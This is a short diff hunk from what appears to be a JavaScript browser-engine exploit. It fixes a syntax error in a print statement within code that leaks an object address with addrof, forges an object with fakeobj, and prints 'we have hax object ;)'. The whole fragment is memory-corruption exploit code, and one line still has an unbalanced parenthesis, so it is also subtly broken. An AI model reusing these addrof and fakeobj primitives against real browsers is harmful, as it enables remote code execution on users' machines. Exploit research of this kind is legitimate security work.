@@ -522,7 +522,7 @@ for (var i = 0; i < 1000; ++i) {
     unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
     var boxed = [{}];
 
-    print("outer @ " + new Int64(addrof(container)+0x10);
+    print("outer @ " + new Int64(addrof(container)+0x10));
 
     var hax = fakeobj(addrof(container) + 0x10));
     print("we have hax object ;)");
